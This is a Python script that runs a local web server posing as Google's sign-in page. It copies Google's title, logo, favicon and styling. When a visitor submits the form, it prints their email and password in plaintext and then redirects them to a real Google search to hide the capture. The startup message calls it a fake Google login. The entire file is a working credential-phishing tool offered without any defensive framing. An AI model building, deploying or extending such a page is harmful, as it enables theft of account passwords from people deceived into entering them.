#
# 
#


from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

class GoogleCloneHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        self.serve_login_page()

    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(content_length).decode()
        data = parse_qs(body)

        email = data.get("email", [""])[0]
        password = data.get("password", [""])[0]
        
        print(f"[LOGIN ATTEMPT] Email: {email} | Password: {password}")

        self.send_response(302)
        self.send_header('Location', 'https://www.google.com/search?q=')
        self.end_headers()

    def serve_login_page(self):
     html = """
     <html lang="en">
     <head>
        <meta charset="UTF-8">
        <title>accounts.google.com</title>
        <style>
            body {
                font-family: Roboto, Arial, sans-serif;
                background-color: #f2f2f2;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 360px;
                margin: 80px auto;
                padding: 40px;
                background: #fff;
                box-shadow: 0 2px 5px rgba(0,0,0,0.2);
                border-radius: 8px;
            }
            .logo {
                display: block;
                margin: 0 auto 20px;
            }
            h1 {
                font-size: 30px;
                font-weight: 400;
                margin-bottom: 10px;
                text-align: center;
            }

            h4 {
                font-size: 13px;
                font-weight: 400;
                margin-bottom: 20px;
                text-align: center;
            }

            .input-group {
                position: relative;
                margin: 20px 0;
            }
            .input-group input {
                width: 100%;
                padding: 12px 12px 12px 12px;
                font-size: 16px;
                border: 1px solid #ccc;
                border-radius: 4px;
                outline: none;
                background-color: transparent;
            }
            .input-group input:focus {
                border: 2px solid #1a73e8;
                padding: 11px 11px 11px 11px; /* Adjust for border size */
            }
            .input-group label {
                position: absolute;
                left: 12px;
                top: 14px;
                color: #757575;
                font-size: 16px;
                pointer-events: none;
                transition: 0.2s ease all;
                background: white;
                padding: 0 4px;
            }
            .input-group input:focus + label,
            .input-group input:not(:placeholder-shown) + label {
                top: -8px;
                font-size: 12px;
                color: #1a73e8;
            }

            button {
                background-color: #1a73e8;
                color: white;
                padding: 12px;
                width: 100%;
                border: none;
                border-radius: 4px;
                font-size: 16px;
                cursor: pointer;
                margin-top: 20px;
            }
            button:hover {
                background-color: #1558b0;
            }
            .footer {
                text-align: center;
                font-size: 12px;
                color: #777;
                margin-top: 20px;
            }
        </style>
        <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
     </head>
     <body>
        <div class="container">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="logo">
            <h1>Login</h1>
            <h4>Use your google account<h4/>
            <form method="POST" action="/login">
                <div class="input-group">
                    <input type="email" name="email" id="email" placeholder=" " required>
                    <label for="email">Email or phone</label>
                </div>
                <div class="input-group">
                    <input type="password" name="password" id="password" placeholder=" " required>
                    <label for="password">Enter your password</label>
                </div>
                <button type="submit">Next</button>
            </form>
        </div>
        <div class="footer">© 2025 Google</div>
     </body>
     </html>
     """
     self.send_response(200)
     self.send_header("Content-Type", "text/html")
     self.end_headers()
     self.wfile.write(html.encode())



if __name__ == "__main__":
    PORT = 8080
    print(f"Running fake Google login at http://127.0.0.1:{PORT}")
    server = HTTPServer(("", PORT), GoogleCloneHandler)
    server.serve_forever()
